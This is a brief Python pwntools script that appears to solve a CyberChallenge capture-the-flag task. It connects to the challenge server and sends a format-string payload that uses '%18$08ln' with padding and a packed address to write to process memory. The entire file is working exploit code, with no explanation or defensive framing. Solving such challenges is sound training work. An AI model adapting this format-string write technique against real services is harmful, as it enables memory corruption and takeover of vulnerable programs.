from pwn import *
import os
p = remote("answer.challs.cyberchallenge.it", 9122)
print(p.recvline())
payload=b"A"*42+b"%18$08ln"+b"BBBBBBBBBBBBBB"+b"\x78\x10\x60\x00\x00\x00\x00\x00"

p.sendline(payload)
print(p.recv())

